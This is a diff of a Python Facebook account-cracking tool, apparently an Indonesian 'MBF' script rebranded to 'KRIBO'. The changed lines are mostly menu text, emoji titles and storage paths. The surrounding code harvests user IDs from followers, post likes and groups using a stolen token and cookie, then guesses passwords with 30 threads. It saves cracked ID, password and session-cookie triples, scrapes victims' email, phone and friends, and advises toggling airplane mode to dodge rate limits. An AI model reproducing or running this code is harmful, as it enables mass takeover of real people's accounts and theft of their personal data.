@@ -189,8 +189,8 @@ def login_lagi334():
 	banner()
 	sky = '[bold cyan][01] LOGIN COOKIE V1\n[02] LOGIN COOKIE V2[/bold cyan]'
 	sky2 = nel(sky, style='red')
-#	cetak(nel(sky2,title='[bold cyan] • LOGIN MENU • [/bold cyan]'))
-#	pil=input('[R] Choose : ')
+#	cetak(nel(sky2,title='[bold cyan] 🌹 LOGIN MENU 🌹 [/bold cyan]'))
+#	pil=input('[f] pilih : ')
 	pil='1'
 	if pil in ['1','01']:
 		try:
@@ -301,23 +301,23 @@ def menu(my_name,my_id):
 	except:birth = '-'
 	banner()
 	sg = '# USER ACCOUNT INFORMATION'
-	fx = mark(sg, style='green')
+	fx = mark(sg, style='cyan')
 	sol().print(fx)
 	print(x+'['+h+'R'+x+'] ACTIVE USER : '+str(my_name))
 	print(x+'['+h+'R'+x+'] USER ID     : '+str(my_id))
 	print(x+'['+h+'R'+x+'] IP ADDRESS  : '+str(sh['origin']))
-	io = '''[bold green][01] DUMP ID PUBLIK	    
-[02] DUMP ID PUBLIK (MASAL)   
-[03] FOLLOWER		     
-[04] DUMP DARI SUKAI	     
-[05] DUMP DARI GRUP 
-[06] CRACK DARI FILE
-[07] CHECK OPSI CEKPOIN
-[08] CHECK HASIL CRACK
+	io = '''[bold cyan][01] DUMP ID PUBLIK  [ON]  	    
+[02] DUMP ID PUBLIK (MASAL)  [ON] 
+[03] DUMP FOLLOWER	     [ON]     
+[04] DUMP DARI SUKAI	     [ON]
+[05] DUMP DARI GRUP          [ON]
+[06] CRACK DARI FILE         [ON]
+[07] CHECK OPSI CEKPOIN      [OF]
+[08] CHECK HASIL CRACK       [OF]
 [09] TIPS CRACK 
-[00] LOGOUT[bold green]'''
+[00] LOGOUT[bold cyan]'''
 	oi = nel(io, style='red')
-	cetak(nel(oi, title='[bold cyan] • MENU CRACK • [/bold cyan]'))
+	cetak(nel(oi, title='[bold cyan] 🌹 MENU CRACK 🌹 [/bold cyan]'))
 	ec = input(x+'['+p+'R'+x+'] Pilih : ')
 	if ec in ['1','01']:
 		dump_publik()
@@ -340,7 +340,7 @@ def menu(my_name,my_id):
 	elif ec in ['0','00']:
 		os.system('rm -rf .token.txt')
 		os.system('rm -rf .cookie.txt')
-		print(x+'['+h+'R'+x+'] WAIT • • •')
+		print(x+'['+h+'f'+x+'] KONTOL • • •')
 		time.sleep(1)
 		sw = '# SUCCESS OUT'
 		sol().print(mark(sw, style='cyan'))
@@ -357,9 +357,9 @@ def result():
 	kayes = '[bold cyan][01] CHECK CP RESULTS\n[02] CHECK OK RESULTS\n[00] BACK TO MENU[/bold cyan]'
 	kis = nel(kayes, style='cyan')
 	cetak(nel(kis, title='RESULTS'))
-	kz = input(x+'['+p+'R'+x+'] Choose : ')
+	kz = input(x+'['+p+'f'+x+'] pilih : ')
 	if kz in ['1','01']:
-		try:vin = os.listdir('/sdcard/4MBF-DATA/CP')
+		try:vin = os.listdir('/sdcard/KRIBO-DATA/CP')
 		except FileNotFoundError:
 			gada = '# STORAGE NOT FOUND '
 			sol().print(mark(gada, style='red'))
@@ -389,7 +389,7 @@ def result():
 					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
 			gerr2 = '# SELECT RESULTS TO SHOW'
 			sol().print(mark(gerr2, style='green'))
-			geeh = input(x+'['+p+'R'+x+'] choose : ')
+			geeh = input(x+'['+p+'f'+x+'] choose : ')
 			try:geh = lol[geeh]
 			except KeyError:
 				ric = '# OPTION NOT IN THE MENU'
@@ -500,7 +500,7 @@ def file():
 		for isi in my_files:
 			try:hem = open('/sdcard/KRIBO-DATA/CP/'+isi,'r').readlines()
 			except:
-				try:hem = open('/sdcard/4MBF-DATA/OK/'+isi,'r').readlines()
+				try:hem = open('/sdcard/KRIBO-DATA/OK/'+isi,'r').readlines()
 				except:continue
 			cih+=1
 			if cih<10:
@@ -579,17 +579,17 @@ def dumpdump(pil):
 def dump_massal():
 	mas='[01] CRACK DARI FILE\n[02] CRACK MANUAL(PER ID)'
 	mas2=nel(mas,style='cyan')
-	cetak(nel(mas2,title=' • MENU •'))
-	pilih=input('[R] Choose : ')
+	cetak(nel(mas2,title=' 🌹 MENU 🌹'))
+	pilih=input('[f] pilih : ')
 	if pilih in ['1','01']:
 		nmfil=input('[•] File Name : ')
 		nmfile=open(nmfil,'r').read().splitlines()
 		for xfil in nmfile:
 			uid.append(xfil)
 	elif pilih in ['2','02']:
-		print(x+'['+h+'R'+x+'] ENTER TOTAL ID LIMIT [20]')
+		print(x+'['+h+'f'+x+'] ENTER TOTAL ID LIMIT [20]')
 		try:
-			jum = int(input(x+'['+p+'R'+x+'] Number Of Id : '))
+			jum = int(input(x+'['+p+'f'+x+'] Number Of Id : '))
 		except ValueError:
 			pesan = '# THE INPUT YOU ENTER IS NOT A NUMBERS'
 			pesan2 = mark(pesan, style='red')
@@ -602,7 +602,7 @@ def dump_massal():
 			exit()
 		ses=requests.Session()
 		yz = 0
-		print(x+'['+h+'R'+x+'] TYPE "me" IF YOU WANT TO DUMP FROM YOUR FRIENDS')
+		print(x+'['+h+'f'+x+'] TYPE "me" IF YOU WANT TO DUMP FROM YOUR FRIENDS')
 		for met in range(jum):
 			yz+=1
 			kl = input(x+'['+h+str(yz)+x+'] Enter The '+str(yz)+'Id : ')
@@ -627,14 +627,14 @@ def dump_pengikut():
 	win = '# DUMP ID FROM FOLLOWERS'
 	win2 = mark(win, style='green')
 	sol().print(win2)
-	print(x+'['+h+'R'+x+'] TYPE "me" IF YOU WANT TO DUMP FROM YOUR FOLLOWERS')
-	pil = input(x+'['+p+'R'+x+'] INPUT TARGET ID : ')
+	print(x+'['+h+'f'+x+'] TYPE "me" IF YOU WANT TO DUMP FROM YOUR FOLLOWERS')
+	pil = input(x+'['+p+'f'+x+'] INPUT TARGET ID : ')
 	try:
 		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cokbrut[0]}).json()
 		for pi in koh2['subscribers']['data']:
 			try:id.append(pi['id']+'|'+pi['name'])
 			except:continue
-		print(x+'['+h+'R'+x+'] TOTAL : '+str(len(id)))
+		print(x+'['+h+'f'+x+'] TOTAL : '+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
 		li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
@@ -655,13 +655,13 @@ def dump_likes():
 	win = '# DUMP ID FROM LIKE POST'
 	win2 = mark(win, style='green')
 	sol().print(win2)
-	pil = input(x+'['+p+'R'+x+'] INPUT ID POST : ')
+	pil = input(x+'['+p+'f'+x+'] INPUT ID POST : ')
 	try:
 		koh2 = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=likes.limit(10000)&access_token='+tokenku[0],cookies={'cookie': cokbrut[0]}).json()
 		for pi in koh2['likes']['data']:
 			try:id.append(pi['id']+'|'+pi['name'])
 			except:continue
-		print(x+'['+h+'R'+x+'] TOTAL : '+str(len(id)))
+		print(x+'['+h+'f'+x+'] TOTAL : '+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
 		li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
@@ -718,7 +718,7 @@ def dump_grup():
 	au = 'GROUP NAME    : '+titt2+'\n'+'GROUP MEMBER : '+str(totid[0])
 	oi = nel(au, style='cyan')
 	cetak(nel(oi, title='[bold cyan] • GROUP TARGET •[/bold cyan]'))
-	au = '[R] TO STOP PRESS CTRL+C\n[R] IF STUCK ON OF AIRPLANE MODE'
+	au = '[?] TO STOP PRESS CTRL+C\n[?] IF STUCK ON OF AIRPLANE MODE'
 	oi = nel(au, style='cyan')
 	cetak(nel(oi, title='[bold cyan] • SUGGESTION •[/bold cyan]'))
 	linkm='https://mbasic.facebook.com/browse/group/members/?id='+idgrup
@@ -825,8 +825,8 @@ def setting():
 	sol().print(mark(wl, style='green'))
 	teks = '[01] CRACK AKUN TUA\n[02] CRACK AKUN MUDA\n[03] CRACK AKUN RONDOM'
 	tak = nel(teks, style='cyan')
-	cetak(nel(tak, title=' • SETTING • '))
-	hu = input(x+'['+p+'R'+x+'] Choose : ')
+	cetak(nel(tak, title=' 🌹 SETTING 🌹 '))
+	hu = input(x+'['+p+'f'+x+'] pilih : ')
 	if hu in ['1','01']:
 		for tua in sorted(id):
 			id2.append(tua)
@@ -852,8 +852,8 @@ def setting():
 	sol().print(mark(met, style='green'))
 	ioz = '[01] METODE MOBILE\n[02] METODE FREE'
 	gess = nel(ioz, style='green')
-	cetak(nel(gess, title=' • METHODE • '))
-	hc = input(x+'['+p+'R'+x+']  : ')
+	cetak(nel(gess, title=' 🌹 METHODE 🌹 '))
+	hc = input(x+'['+p+'f'+x+']  : ')
 	if hc in ['1','01']:
 		method.append('mobile')
 	elif hc in ['2','02']:
@@ -866,14 +866,14 @@ def setting():
 		method.append('mobile')
 	guw = '# MENAMPILKAN APP TERKAIT ? (y/t)'
 	sol().print(mark(guw, style='yellow'))
-	aplik = input(x+'['+p+'R'+x+'] Choose : ')
+	aplik = input(x+'['+p+'f'+x+'] pilih : ')
 	if aplik in ['y','Y']:
 		taplikasi.append('ya')
 	else:
 		taplikasi.append('no')
 	guw = '# MENAMPILKAN OPSI CEKPOIN ? (y/t)'
 	sol().print(mark(guw, style='yellow'))
-	osk = input(x+'['+p+'R'+x+'] Choose : ')
+	osk = input(x+'['+p+'f'+x+'] pilih : ')
 	if osk in ['y','Y']:
 		oprek.append('ya')
 	else:
@@ -881,14 +881,14 @@ def setting():
 
 	guw = '# MENAMPILKAN HASIL CEKPOIN ? (y/t)'
 	sol().print(mark(guw, style='yellow'))
-	cpres = input(x+'['+p+'R'+x+'] Choose : ')
+	cpres = input(x+'['+p+'f'+x+'] pilih : ')
 	if cpres in ['y','Y']:
 		princp.append('ya')
 	else:
 		princp.append('no')
 	guw = '# MENAMBAHKAN SANDI TAMBAHAN ? (y/t)'
 	sol().print(mark(guw, style='yellow'))
-	pwplus=input(x+'['+p+'R'+x+'] Choose : ')
+	pwplus=input(x+'['+p+'f'+x+'] pilih : ')
 	if pwplus in ['y','Y']:
 		pwpluss.append('ya')
 		krek = '[R] USE COMMA AS SEPARATE\n[R] USE LOWER LETTERS\n[R] EXAMPLE: indonesia,kontol,sayang'
@@ -905,7 +905,7 @@ def setting():
 def passwrd():
 	ler = '# CRACK PROCESS START, PRESS CTRL+Z TO STOP'
 	sol().print(mark(ler, style='green'))
-	krek = '[R] OK RESULTS SAVED IN : INTERNAL MEMORY/KRIBO-DATA/OK/%s\n[R] CP RESULTS SAVED IN : INTERNAL MEMORY/KRIBO-DATA/CP/%s\nON OF AIRPLANE MODE EVERY 500 ID'%(okc,cpc)
+	krek = '[!] OK RESULTS SAVED IN : INTERNAL MEMORY/KRIBO-DATA/OK/%s\n[!] CP RESULTS SAVED IN : INTERNAL MEMORY/KRIBO-DATA/CP/%s\nON OF MODE PESAWATD SETIAP 500 ID'%(okc,cpc)
 	cetak(nel(krek, title=' • CRACK • '))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
@@ -980,13 +980,13 @@ def crack(idf,pwv,nmf):
 				elif 'ya' in princp:
 					print('\n')
 					try:
-						statuscp = f'\r[R] ID       : {idf} \n[R] PASSWORD : {pw} \n[R] NAME : {nmf}\n[R] BIRTHDAY : {ttl}'
+						statuscp = f'\r[LBK] ID       : {idf} \n[LBK] PASSWORD : {pw} \n[LBK] NAME : {nmf}\n[LBK] BIRTHDAY : {ttl}'
 						open('/sdcard/KRIBO-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'|'+ttl+'\n')
 					except:
-						statuscp = f'\r[R] ID       : {idf} \n[R] PASSWORD : {pw} \n[R] NAME : {nmf}'
-						open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+						statuscp = f'\r[LBK] ID       : {idf} \n[LBK] PASSWORD : {pw} \n[LBK] NAME : {nmf}'
+						open('/sdcard/KRIBO-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					statuscp1 = nel(statuscp, style='blue')
-					cetak(nel(statuscp1, title='😔-CP'))
+					cetak(nel(statuscp1, title='KRIBO-CP'))
 					cp+=1
 				else:continue
 				break
@@ -997,9 +997,9 @@ def crack(idf,pwv,nmf):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					open('/sdcard/KRIBO-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
-					statusok = f'[R] ID       : {idf}\n[R] PASSWORD : {pw}\n[R] COOKIES  : {kuki}'
+					statusok = f'[LBK] ID       : {idf}\n[LBK] PASSWORD : {pw}\n[LBK] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='🤗-OK'))
+					cetak(nel(statusok1, title='KRIBO-OK'))
 					ok+=1
 					break
 				elif 'ya' in taplikasi:
@@ -1012,30 +1012,30 @@ def crack(idf,pwv,nmf):
 					emhp=requests.get('https://mbasic.facebook.com/profile.php?v=info',cookies=coki,headers=headapp).text
 					try:
 						email=re.search('target="_blank">(.*?)&#064;(.*?)<',str(emhp)).groups(1)
-						infoakun+= (f"[bold green][R] EMAIL : {email[0]}@{email[1]}[/bold green]\n")
+						infoakun+= (f"[bold green][LBK] EMAIL : {email[0]}@{email[1]}[/bold green]\n")
 					except:
-						infoakun+= (f"[bold green][R] EMAIL : - [/bold green]\n")
+						infoakun+= (f"[bold green][LBK] EMAIL : - [/bold green]\n")
 					try:
 						nohp=re.search('>08(.*?)-(.*?)-(.*?)</span>',str(emhp)).groups(1)
-						infoakun+= (f"[bold green][R] PHONE NUMBER : 08{nohp[0]}{nohp[1]}{nohp[2]}[/bold green]\n")
+						infoakun+= (f"[bold green][LBK] PHONE NUMBER : 08{nohp[0]}{nohp[1]}{nohp[2]}[/bold green]\n")
 					except:
-						infoakun+= (f"[bold green][R] PHONE NUMBER : - [/bold green]\n")
+						infoakun+= (f"[bold green][LBK] PHONE NUMBER : - [/bold green]\n")
 					try:
 						tems=session.get('https://mbasic.facebook.com/profile.php?id='+idf+'&v=friends',cookies=coki,headers=headapp).text
 						teman=re.search('>Teman (.*?)<',str(tems)).groups(1)
 						tem=teman[0].split('(')
 						temm=tem[1].split(')')
-						infoakun+= (f"[bold green][R] FRIEND : {temm[0]}[/bold green]\n")
+						infoakun+= (f"[bold green][LBK] FRIEND : {temm[0]}[/bold green]\n")
 					except:
-						infoakun+= (f"[bold green][R] FRIEND : - [/bold green]\n")
+						infoakun+= (f"[bold green][LBK] FRIEND : - [/bold green]\n")
 					try:
 						tahs=session.get('https://mbasic.facebook.com/'+idf+'/allactivity/?entry_point=settings_yfi&settings_tracking=mbasic_footer_link%3Asettings_2_0&privacy_source=your_facebook_information&_rdr',cookies=coki,headers=headapp).text
 						tah=re.findall('id="year_(.*?)"',str(tahs))
 						tahu=(len(tah)-1)
 						tahun=tah[tahu]
-						infoakun+= (f"[bold green][R] YEAR ACCOUNT : {tahun} [/bold green]\n")
+						infoakun+= (f"[bold green][LBK] YEAR ACCOUNT : {tahun} [/bold green]\n")
 					except:
-						infoakun+= (f"[bold green][R] YEAR ACCOUNT : -  [/bold green]\n")
+						infoakun+= (f"[bold green][LBK] YEAR ACCOUNT : -  [/bold green]\n")
 
 
 					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
@@ -1048,16 +1048,16 @@ def crack(idf,pwv,nmf):
 						nok+=1
 
 					hit=0
-					infoakun += (f"\n[bold yellow][R] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
+					infoakun += (f"\n[bold yellow][LBK] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
 					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
 					hit=0
 					for muncul in apkexp:
 						hit+=1
 						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
 					print('\n')
-					statusok = f'[bold green]\r[R] ID       : {idf}\n[R] PASSWORD : {pw}\n[R] COOKIES  : {kuki}[/bold green]\n{infoakun}'
+					statusok = f'[bold green]\r[LBK] ID       : {idf}\n[LBK] PASSWORD : {pw}\n[LBK] COOKIES  : {kuki}[/bold green]\n{infoakun}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='[bold green]🤗-OK[/bold green]'))
+					cetak(nel(statusok1, title='[bold green]KRIBO-OK[/bold green]'))
 					ok+=1
 					break
 
@@ -1095,9 +1095,9 @@ def crackfree(idf,pwv):
 					ceker(idf,pw)
 				elif 'ya' in princp:
 					print('\n')
-					statuscp = f'[R] ID       : {idf} [R] PASSWORD : {pw}'
+					statuscp = f'[LBK] ID       : {idf} [LBK] PASSWORD : {pw}'
 					statuscp1 = nel(statuscp, style='blue')
-					cetak(nel(statuscp1, title='😔-CP'))
+					cetak(nel(statuscp1, title='KRIBO-CP'))
 					open('/sdcard/KRIBO-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
@@ -1110,9 +1110,9 @@ def crackfree(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					open('/sdcard/KRIBO-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
-					statusok = f'[R] ID       : {idf}\n[R] PASSWORD : {pw}\n[R] COOKIES  : {kuki}'
+					statusok = f'[LBK] ID       : {idf}\n[LBK] PASSWORD : {pw}\n[LBK] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='🤗-OK'))
+					cetak(nel(statusok1, title='KRIBO-OK'))
 					ok+=1
 					break
 				elif 'ya' in taplikasi:
@@ -1124,7 +1124,7 @@ def crackfree(idf,pwv):
 					session = requests.Session()
 					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
 					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
-					infoakun += (f"\n[bold cyan][R] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
+					infoakun += (f"\n[bold cyan][LBK] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
 					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
 					nok=1
 					for muncul in apkaktif:
@@ -1132,16 +1132,16 @@ def crackfree(idf,pwv):
 						nok+=1
 
 					hit=0
-					infoakun += (f"\n[bold yellow][R] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
+					infoakun += (f"\n[bold yellow][LBK] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
 					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
 					hit=0
 					for muncul in apkexp:
 						hit+=1
 						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
 					print('\n')
-					statusok = f'[bold green][R] ID       : {idf}\n[R] PASSWORD : {pw}\n[R] COOKIES  : {kuki}[/bold green]\n{infoakun}'
+					statusok = f'[bold green][LBK] ID       : {idf}\n[LBK] PASSWORD : {pw}\n[LBK] COOKIES  : {kuki}[/bold green]\n{infoakun}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='[bold green]🤗-OK[/bold green]'))
+					cetak(nel(statusok1, title='[bold green]KRIBO-OK[/bold green]'))
 					ok+=1
 					break
 
@@ -1179,9 +1179,9 @@ def cracktouch(idf,pwv):
 					ceker(idf,pw)
 				elif 'ya' in princp:
 					print('\n')
-					statuscp = f'[R] ID       : {idf} [R] PASSWORD : {pw}'
+					statuscp = f'[LBK] ID       : {idf} [LBK] PASSWORD : {pw}'
 					statuscp1 = nel(statuscp, style='blue')
-					cetak(nel(statuscp1, title='😔-CP'))
+					cetak(nel(statuscp1, title='KRIBO-CP'))
 					open('/sdcard/KRIBO-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
@@ -1194,9 +1194,9 @@ def cracktouch(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					open('/sdcard/KRIBO-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
-					statusok = f'[R] ID       : {idf}\n[R] PASSWORD : {pw}\n[R] COOKIES  : {kuki}'
+					statusok = f'[LBK] ID       : {idf}\n[LBK] PASSWORD : {pw}\n[LBK] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='🤗-OK'))
+					cetak(nel(statusok1, title='KRIBO-OK'))
 					ok+=1
 					break
 				elif 'ya' in taplikasi:
@@ -1223,9 +1223,9 @@ def cracktouch(idf,pwv):
 						hit+=1
 						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
 					print('\n')
-					statusok = f'[bold green][R] ID       : {idf}\n[R] PASSWORD : {pw}\n[R] COOKIES  : {kuki}[/bold green]\n{infoakun}'
+					statusok = f'[bold green][LBK] ID       : {idf}\n[LBK] PASSWORD : {pw}\n[LBK] COOKIES  : {kuki}[/bold green]\n{infoakun}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='[bold green]🤗-OK[/bold green]'))
+					cetak(nel(statusok1, title='[bold green]KRIBO-OK[/bold green]'))
 					ok+=1
 					break
 
@@ -1262,9 +1262,9 @@ def crackmbasic(idf,pwv):
 					ceker(idf,pw)
 				elif 'ya' in princp:
 					print('\n')
-					statuscp = f'[R] ID       : {idf} [R] PASSWORD : {pw}'
+					statuscp = f'[LBK] ID       : {idf} [LBK] PASSWORD : {pw}'
 					statuscp1 = nel(statuscp, style='blue')
-					cetak(nel(statuscp1, title='😔-CP'))
+					cetak(nel(statuscp1, title='KRIBO-CP'))
 					open('/sdcard/KRIBO-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
@@ -1277,9 +1277,9 @@ def crackmbasic(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					open('/sdcard/KRIBO-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
-					statusok = f'[R] ID       : {idf}\n[R] PASSWORD : {pw}\n[R] COOKIES  : {kuki}'
+					statusok = f'[LBK] ID       : {idf}\n[LBK] PASSWORD : {pw}\n[LBK] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='🤗-OK'))
+					cetak(nel(statusok1, title='KRIBO-OK'))
 					ok+=1
 					break
 				elif 'ya' in taplikasi:
@@ -1291,7 +1291,7 @@ def crackmbasic(idf,pwv):
 					session = requests.Session()
 					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
 					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
-					infoakun += (f"\n[bold cyan][R] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
+					infoakun += (f"\n[bold cyan][LBK] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
 					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
 					nok=1
 					for muncul in apkaktif:
@@ -1299,16 +1299,16 @@ def crackmbasic(idf,pwv):
 						nok+=1
 
 					hit=0
-					infoakun += (f"\n[bold yellow][R] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
+					infoakun += (f"\n[bold yellow][LBK] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
 					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
 					hit=0
 					for muncul in apkexp:
 						hit+=1
 						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
 					print('\n')
-					statusok = f'[bold green][R] ID       : {idf}\n[R] PASSWORD : {pw}\n[R] COOKIES  : {kuki}[/bold green]\n{infoakun}'
+					statusok = f'[bold green][LBK] ID       : {idf}\n[LBK] PASSWORD : {pw}\n[LBK] COOKIES  : {kuki}[/bold green]\n{infoakun}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='[bold green]🤗-OK[/bold green]'))
+					cetak(nel(statusok1, title='[bold green]KRIBO-OK[/bold green]'))
 					ok+=1
 					break
 
@@ -1325,7 +1325,7 @@ def cek_opsi():
 	c = len(akun)
 	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
 	cetak(nel(hu, title='CEK OPSI'))
-	input(x+'['+h+'R'+x+'] Mulai')
+	input(x+'['+h+'f'+x+'] Mulai')
 	cek = '# PROSES CEK OPSI DIMULAI'
 	sol().print(mark(cek, style='green'))
 	love = 1
@@ -1383,16 +1383,16 @@ def cekopsii(id,pw,ttl):
 					if opsinya=='':
 						try:
 							open('/sdcard/KRIBO-DATA/TAP-A2F/'+tpc,'a').write(id+'|'+pw+'|'+ttl+'\n')
-							statusok = f'\r[R] ID       : {id}\n[R] PASSWORD : {pw}\n[R] BIRTHDAY : {ttl}\n[R] CHECKPOINT OPTION   : TAP YES / A2F ON (LOGIN MBASIC)'
+							statusok = f'\r[LBK] ID       : {id}\n[LBK] PASSWORD : {pw}\n[LBK] BIRTHDAY : {ttl}\n[LBK] CHECKPOINT OPTION   : TAP YES / A2F ON (LOGIN MBASIC)'
 						except:
 							open('/sdcard/KRIBO-DATA/TAP-A2F/'+tpc,'a').write(id+'|'+pw+'\n')
-							statusok = f'\r[R] ID       : {id}\n[R] PASSWORD : {pw}\n[R] CHECKPOINT OPTION   : TAP YES / A2F ON (LOGIN MBASIC)'
+							statusok = f'\r[LBK] ID       : {id}\n[LBK] PASSWORD : {pw}\n[LBK] CHECKPOINT OPTION   : TAP YES / A2F ON (LOGIN MBASIC)'
 					else:
 						try:
-							statusok = f'\r[R] ID       : {id}\n[R] PASSWORD : {pw}\n[R] BIRTHDAY : {ttl}\n[R] CHECKPOINT OPTION   :\n {opsinya}'
+							statusok = f'\r[LBK] ID       : {id}\n[LBK] PASSWORD : {pw}\n[LBK] BIRTHDAY : {ttl}\n[LBK] CHECKPOINT OPTION   :\n {opsinya}'
 							open('/sdcard/KRIBO-DATA/CP/'+cpc,'a').write(id+'|'+pw+'|'+ttl+'\n')
 						except:
-							statusok = f'\r[R] ID       : {id}\n[R] PASSWORD : {pw}\n[R] CHECKPOINT OPTION   :\n {opsinya}'
+							statusok = f'\r[LBK] ID       : {id}\n[LBK] PASSWORD : {pw}\n[LBK] CHECKPOINT OPTION   :\n {opsinya}'
 							open('/sdcard/KRIBO-DATA/CP/'+cpc,'a').write(id+'|'+pw+'\n')
 					statusok1 = nel(statusok, style='yellow')
 					cetak(nel(statusok1, title='CHECKPOINT OPTION'))
@@ -1402,16 +1402,16 @@ def cekopsii(id,pw,ttl):
 					exit()
 			elif "c_user" in req.cookies.get_dict().keys():
 				try:
-					statusok = f'\r[R] ID       : {id}\n[R] PASSWORD : {pw}\n[R] BIRTHDAY : {ttl}\n[R] CHECKPOINT OPTION   :\n {opsinya}'
+					statusok = f'\r[LBK] ID       : {id}\n[LBK] PASSWORD : {pw}\n[LBK] BIRTHDAY : {ttl}\n[LBK] CHECKPOINT OPTION   :\n {opsinya}'
 				except:
-					statusok = f'\r[R] ID       : {id}\n[R] PASSWORD : {pw}'
+					statusok = f'\r[LBK] ID       : {id}\n[LBK] PASSWORD : {pw}'
 				statusok1 = nel(statusok, style='yellow')
 				cetak(nel(statusok1, title='CHECKPOINT OPTION'))
 				open('/sdcard/KRIBO-DATA/OK/'+okc,'a').write(id+'|'+pw+'\n')
 
 			else:
 				print('\n\r')
-				statusok = f'\r[R] ID : {id} [R] PASSWORD : {pw}'
+				statusok = f'\r[LBK] ID : {id} [LBK] PASSWORD : {pw}'
 				statusok1 = nel(statusok, style='red')
 				cetak(nel(statusok1, title='WRONG PASSWORD'))
 		except requests.exceptions.ConnectionError:
